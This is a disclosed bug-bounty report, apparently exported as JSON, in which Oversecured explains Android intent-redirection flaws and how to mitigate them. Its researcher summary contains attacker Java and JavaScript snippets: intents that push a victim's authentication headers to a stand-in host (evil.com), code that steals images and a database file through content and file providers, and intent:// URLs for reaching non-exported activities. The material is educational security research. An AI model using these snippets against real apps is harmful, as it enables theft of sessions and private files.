{"id":951691,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTE2OTE=","url":"https://hackerone.com/reports/951691","title":"Android: Explanation of Access to app protected components vulnerability","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2020-08-05T15:55:48.667Z","submitted_at":"2020-08-05T15:55:48.667Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"oversecured","url":"/oversecured","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/RURuzuz7NPPcoG2xXkeCEpTb/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":31807,"url":"https://hackerone.com/redact","handle":"redact","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"profile":{"name":"██████","twitter_handle":"","website":"","about":"██████ "}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-11T18:39:31.775Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"████████████████████████████","original_report_id":null,"original_report_url":null,"attachments":[{"id":937502,"file_name":"image_2020-08-04_19-18-50.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/PBQC7iQmk5iUSmtGMxKPfzLZ?response-content-disposition=attachment%3B%20filename%3D%22image_2020-08-04_19-18-50.png%22%3B%20filename%2A%3DUTF-8%27%27image_2020-08-04_19-18-50.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTQR22CE2%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154443Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHylhpFJOF4pRe7XlaDX6z3BLEup%2BswnNkaACr%2Fwjwr8AiASjuyeD0TYwrZA5sOldf5eC6UQrO8hSHC9jNR%2BVNumhyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMfK%2BofD1wJOHYcOUJKtcDnC3f8Y3jglGs7z8YlxF9bdYkYlsSrPxEkx9hDqtH%2BQ3u1daZrwyM6F3WHlk0a%2BWNezGk%2FnRxFWuvgXlXXAEBaCUWEe1UXv97gs6KKr%2F4fZ92%2FH3VXeVMioYLi220Z8qDdmiwSK2Z%2FPfK0nlRhO3v9Ee3r3C7BMq5B4DRnfxp0cJyzU%2FHbMNzQNjyO%2BlGzreHCzcyKBe%2FoFAr2W6xbLokCINrIUxMnvI9Mxs7SraD%2FF2sZw8Ln4uZ6aJweQoOPwsnYKkrRjb370Lt%2FREkrEj9pcgae0C9R5BTZegZaqNN6CzMkZfNHB7RmNrhJFg6j7%2BfPYLcWFNxzvJV9dbVJdocqrM5Jmi3hE47KOBrMSGuFrCha2vRk9P64hqfhM1GdDtMLFZZn5VqOJgdyVWZ8bTrZpmlBP%2FJ6YiHIaMTH8G%2FRndaRrVRAR8iOSqWok%2FikWajxMvcVA29H%2F5RznwCFPkLrSbv34tOiWcwVp50Yy3HjkGq4LnY67LMRRRIwThQ9vc%2BM3G9xlb7TwO6%2F3vE5U6azDCH6hDFQ3Xi8ZJVYrTOOWINnf%2BC3BIhvL8Uql%2FhI1vUmbQiAR01xN%2FdEQ9ReTSo0pfJ3SDSXhBXiwUW0IRKspJO189rJyI3MImNkYsGOqYBwdOGh60JXyl1FPj8jwEbnfg6var6H0hyaUwn%2B%2FnamMWODqDwoSJI6f0Q6RJHnQJo2gfc6OFgj1W2B%2FGcJDL4gMvwPBD8bBDDMSaZ3x1nqw%2FhzMwsaQP%2BTnUJEKAVQSe3o5Yvwzg%2FSvpNP%2By981FbIZs9aWoGNPHY48ZIUNdNLCWPS2PxNm9xHrAxEcqn8ib1XLvQQS%2FALl2CG36%2BewUP2tPIf%2BIPmw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=977edc4c4e7487fb3c8cf7ef45a1e627785e2a02c92b0ae2ce9c8839fd91f0fe","file_size":118492,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":37,"voters":["samengmg","mzfr","sheikhrishad0","mik317","theappsec","rahulkadavil_","nipe","3x3s","dhammu2","the_ste_hack","and 27 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8855693,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-08-05T15:55:48.668Z","updated_at":"2020-08-05T15:55:48.668Z","actor":{"username":"oversecured","cleared":false,"url":"/oversecured","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RURuzuz7NPPcoG2xXkeCEpTb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"oversecured","url":"/oversecured"},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9793945,"is_internal":false,"editable":false,"type":"Activities::ReassignedToTeam","message":"","automated_response":false,"created_at":"2020-11-11T18:38:56.308Z","updated_at":"2020-11-11T18:38:56.308Z","additional_data":{"old_team":"Publishing Placeholder","new_team":"██████"},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9793949,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-11-11T18:39:31.816Z","updated_at":"2020-11-11T18:39:31.816Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":23921,"category":"researcher","content":"## Introduction\nThis vulnerability resembles Open Redirect in web security. Since class `Intent` is `Parcelable`, objects belonging to this class can be passed as extra data in another `Intent` object. Many developers make use of this feature and create proxy components (activities, broadcast receivers and services) that take an embedded Intent and pass it to dangerous methods like `startActivity(...)`, `sendBroadcast(...)`, etc. This is dangerous because an attacker can force the app to launch a non-exported component that cannot be launched directly from another app, or to grant the attacker access to its content providers. `WebView` also sometimes changes a URL from a string to an `Intent` object, using the `Intent.parseUri(...)` method, and passes it to `startActivity(...)`. This leads to a violation of Android's security design, and nullifies all the access restrictions the developers have created. According to Oversecured statistics, more than 80% of apps contain this vulnerability. This may result in the theft of authentication details (the user's session), the forging of content within the app, and sometimes also to the execution of arbitrary code – for example, in situations where an attacker can acquire the ability to rewrite files and substitute for the native library.\n\n## A typical case\nLet us examine an example. Fragment of the `AndroidManifest.xml` file\n```xml\n    \u003cactivity android:name=\".ProxyActivity\" android:exported=\"true\" /\u003e\n    \u003cactivity android:name=\".AuthWebViewActivity\" android:exported=\"false\" /\u003e\n```\n\nActivity `ProxyActivity`\n```java\n\tstartActivity((Intent) getIntent().getParcelableExtra(\"extra_intent\"));\n```\n\nActivity `AuthWebViewActivity`\n```java\n    webView.loadUrl(getIntent().getStringExtra(\"url\"), getAuthHeaders());\n```\n`AuthWebViewActivity` is an example of hidden app functionality that performs certain unsafe actions, in this case passing the user's authentication session to a URL obtained from the `url` parameter.\n\nExport restrictions mean the attacker cannot access `AuthWebViewActivity` directly. A direct call\n```java\n    Intent intent = new Intent();\n    intent.setClassName(\"com.victim\", \"com.victim.AuthWebViewActivity\");\n    intent.putExtra(\"url\", \"http://evil.com/\");\n    startActivity(intent);\n```\nthrows a `java.lang.SecurityException`, due to `Permission Denial`: `AuthWebViewActivity not exported from uid 1337`.\n\nBut the attacker can force the victim to launch `AuthWebViewActivity` itself:\n```java\n    Intent extra = new Intent();\n    extra.setClassName(\"com.victim\", \"com.victim.AuthWebViewActivity\");\n    extra.putExtra(\"url\", \"http://evil.com/\");\n\n    Intent intent = new Intent();\n    intent.setClassName(\"com.victim\", \"com.victim.ProxyActivity\");\n    intent.putExtra(\"extra_intent\", extra);\n    startActivity(intent);\n```\nand no security violation will arise, because the app that is under attack does have access to all its own components. Using this code fragment, the attacker can bypass the Android system's built-in restrictions.\n\nWhen mobile app security researchers discover a vulnerability of this kind, they need to develop an attack to demonstrate the maximum possible impact. This requires studying the functionality of hidden components.\n\n## Escalation of attacks via Content Providers\nBesides access to arbitrary components of the original app, the attacker can attempt to gain access to those of the vulnerable app's Content Providers that satisfy the following conditions:\n* it must be non-exported (otherwise it could be attacked directly, without using the vulnerability we are discussing in this article)\n* it must have the `android:grantUriPermissions` flag set to `true`.\n\nThe attacker must set itself as the recipient of an embedded intent and set the following flags\n* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` permits persistent access to the provider (without this flag, the access is one-time only)\n* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` permits URI access by prefix – for example, instead of repeatedly obtaining separate access using a complete path such as `content://com.victim.provider/image/1` the attacker can grant access to all the provider's content using the URI `content://com.victim.provider/` and then use `ContentResolver` to address `content://com.victim.provider/image/1`, `content://com.victim.provider/image/2`, etc.\n* `Intent.FLAG_GRANT_READ_URI_PERMISSION` permits read operations on the provider (such as `query`, `openFile`, `openAssetFile`)\n* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` permits write operations\n\nAn example of a typical provider where an attacker can gain access to it and perform regular operations like `query`, `update`, `insert`, `delete`, `openFile`, `openAssetFile`\n```xml\n\t\u003cprovider android:name=\"com.victim.ContentProvider\" android:exported=\"false\" android:authorities=\"com.victim.provider\" android:grantUriPermissions=\"true\"/\u003e\n```\n\nExample of the theft of user pictures\n`AndroidManifest.xml` file\n```xml\n\t\u003cactivity android:name=\".LeakActivity\" android:exported=\"true\" /\u003e\n```\n\n`MainActivity.java` file\n```java\n    Intent extra = new Intent();\n    extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION\n            | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION\n            | Intent.FLAG_GRANT_READ_URI_PERMISSION\n            | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);\n    extra.setClassName(getPackageName(), \"com.attacker.LeakActivity\");\n    extra.setData(Uri.parse(\"content://com.victim.provider/\"));\n\n    Intent intent = new Intent();\n    intent.setClassName(\"com.victim\", \"com.victim.ProxyActivity\");\n    intent.putExtra(\"extra_intent\", extra);\n    startActivity(intent);\n```\n\n`LeakActivity.java`\n```java\n\tUri uri = Uri.parse(getIntent().getDataString() + \"image/1\")); // content://com.victim.provider/image/1\n\tBitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image\n```\n\n## Attacks on Android File Provider\nThis vulnerability also makes it possible for the attacker to steal app files located in directories that the developer predetermined. For a successful attack, the malign app needs to obtain access rights to Android File Provider and then read content from the file provider using Android ContentResolver.\n\nExample file provider (for more details see https://developer.android.com/reference/android/support/v4/content/FileProvider)\n```xml\n\t\u003cprovider android:name=\"androidx.core.content.FileProvider\" android:exported=\"false\" android:authorities=\"com.victim.files_provider\" android:grantUriPermissions=\"true\"\u003e\n\t    \u003cmeta-data android:name=\"android.support.FILE_PROVIDER_PATHS\" android:resource=\"@xml/provider_paths\"/\u003e\n\t\u003c/provider\u003e\n```\nIt provides read/write access to files on a special list that can be found in the app resources, in this case at `res/xml/provider_paths.xml`\n\nIt may look somewhat like\n```xml\n\t\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\n\t\u003cpaths\u003e\n\t    \u003croot-path name=\"root\" path=\"\"/\u003e\n\t    \u003cfiles-path name=\"internal_files\" path=\".\"/\u003e\n\t    \u003ccache-path name=\"cache\" path=\"\"/\u003e\n\t    \u003cexternal-path name=\"external_files\" path=\"images\"/\u003e\n\t\u003c/paths\u003e\n```\n\nEach tag specifies a root directory with a `path` value relative to the root. For instance, the value `external_files` will correspond to `new File(Environment.getExternalStorageDirectory(), \"images\")`\n\nThe value `root-path` corresponds to `/`, i.e. provides access to arbitrary files.\n\nLet us say we have some secret data stored in the file `/data/data/com.victim/databases/secret.db`: the theft of this file may look something like this\n`MainActivity.java`\n```java\n    Intent extra = new Intent();\n    extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\n    extra.setClassName(getPackageName(), \"com.attacker.LeakActivity\");\n    extra.setData(Uri.parse(\"content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db\"));\n\n    Intent intent = new Intent();\n    intent.setClassName(\"com.victim\", \"com.victim.ProxyActivity\");\n    intent.putExtra(\"extra_intent\", extra);\n    startActivity(intent);\n```\n\n`LeakActivity.java`\n```java\n\tInputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server\n```\n\n## Access to arbitrary components via WebView\nAn Intent object can be cast to a string with a call to `Intent.toUri(flags)` and back from a string to an Intent using `Intent.parseUri(stringUri, flags)`. This functionality is often used in WebView (the app's built-in browser): the app can verify an `intent://` scheme, parse the URL into an Intent and launch the activity.\n\nThis vulnerability can be exploited both via other vulnerabilities (e.g. the ability to open arbitrary links in-app in WebView directly via exported activities or by way of the deeplink mechanism) in the client app and also remotely, including cross-site scripting on the server side or MitM on the client side\n\nExample of vulnerable code\n```java\n    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {\n        Uri uri = request.getUrl();\n        if(\"intent\".equals(uri.getScheme())) {\n            startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));\n            return true;\n        }\n        return super.shouldOverrideUrlLoading(view, request);\n    }\n```\n\nThe point here is that the `shouldOverrideUrlLoading(...)` method of class `WebViewClient` is called each time WebView tries to load a new link, but gives the app the option of adding a custom handler.\n\nTo exploit this vulnerability the attacker needs to create a WebView redirect to a specially prepared intent-scheme URL. \nExample of URL creation\n```java\n    Intent intent = new Intent();\n    intent.setClassName(\"com.victim\", \"com.victim.AuthWebViewActivity\");\n    intent.putExtra(\"url\", \"http://evil.com/\");\n    Log.d(\"evil\", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs \"intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end\"\n```\n\nExample attack\n```js\n\tlocation.href = \"intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end\";\n```\n\nThis version contains several restrictions compared to the classic version of the vulnerability:\n* Embedded `Parcelable` and `Serializable` objects cannot be cast to string (they will be ignored)\n* The insecure flags `Intent.FLAG_GRANT_READ_URI_PERMISSION` and `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` are ignored when `Intent.parseUri(...)` is called. The parser will only leave them if the `Intent.URI_ALLOW_UNSAFE` (`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))` flag is set, which is very rare\n\nMany developers still forget to carry out a complete filtering of intents received via WebView\n```java\n    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {\n        Uri uri = request.getUrl();\n        if(\"intent\".equals(uri.getScheme())) {\n        \tIntent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);\n        \tintent.addCategory(\"android.intent.category.BROWSABLE\");\n        \tintent.setComponent(null);\n            startActivity(intent);\n            return true;\n        }\n        return super.shouldOverrideUrlLoading(view, request);\n    }\n```\nThe attacker can specify a non-exported component via a selector\n```java\n    Intent intent = new Intent();\n    intent.setSelector(new Intent().setClassName(\"com.victim\", \"com.victim.AuthWebViewActivity\"));\n    intent.putExtra(\"url\", \"http://evil.com/\");\n    Log.d(\"evil\", intent.toUri(Intent.URI_INTENT_SCHEME)); // \"intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end\"\n```\nAnd bypass the app's protection against explicit intents. We therefore recommend filtering the selector as well\n```java\n\tintent.addCategory(\"android.intent.category.BROWSABLE\");\n\tintent.setComponent(null);\n\tintent.setSelector(null);\n```\n\nBut even complete filtering does not guarantee complete protection, because an attacker can create an implicit intent corresponding to the `intent-filter` of some non-exported activity. Example of an activity declaration:\n```xml\n    \u003cactivity android:name=\".AuthWebViewActivity\" android:exported=\"false\"\u003e\n        \u003cintent-filter\u003e\n            \u003caction android:name=\"android.intent.action.VIEW\" /\u003e\n            \u003ccategory android:name=\"android.intent.category.DEFAULT\" /\u003e\n            \u003cdata android:scheme=\"victim\" android:host=\"secure_handler\" /\u003e\n        \u003c/intent-filter\u003e\n    \u003c/activity\u003e\n```\n```java\n    webView.loadUrl(getIntent().getData().getQueryParameter(\"url\"), getAuthHeaders());\n```\nWe therefore recommend checking that an activity is exported before it is launched.\n\n## Other ways of creating insecure intents\nSome app developers implement their own intent parsers (often to handle deeplinks or push messages), using e.g. JSON objects, strings or byte arrays, which either do not differ from the default or else present a great danger, because they may expand `Serializable` and `Parcelable` objects and they also allow insecure flags to be set.\nThe security researcher may also encounter more exotic versions of intent creation, such as casting a byte array to a `Parcel` and then reading an intent from it\n```java\n    Uri deeplinkUri = getIntent().getData();\n    if(deeplinkUri.toString().startsWith(\"deeplink://handle/\")) {\n        byte[] handle = Base64.decode(deeplinkUri.getQueryParameter(\"param\"), 0);\n        Parcel parcel = Parcel.obtain();\n        parcel.unmarshall(handle, 0, handle.length);\n        startActivity((Intent) parcel.readParcelable(getClassLoader()));\n    }\n```\n\n\n## Conclusion\nIntents are a very important element of the Android system, because they are used for all interaction between and within apps. It is difficult to avoid all errors when working with them, and as the app gets larger the likelihood it will contain errors and the likely number of errors both increase. [Oversecured](https://oversecured.com/) can find all known weak spots involved in working with Intents, and all the cases it discovers are included in the scan report. Example from [OVAA](https://github.com/oversecured/ovaa):\n\n{F937502}","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":1049378,"username":"oversecured","name":"Oversecured Inc","bio":"","cleared":false,"website":"https://oversecured.com/","location":"","created_at":"2020-04-16T16:05:05.179Z","url":"https://hackerone.com/oversecured","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/RURuzuz7NPPcoG2xXkeCEpTb/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/RURuzuz7NPPcoG2xXkeCEpTb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/RURuzuz7NPPcoG2xXkeCEpTb/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}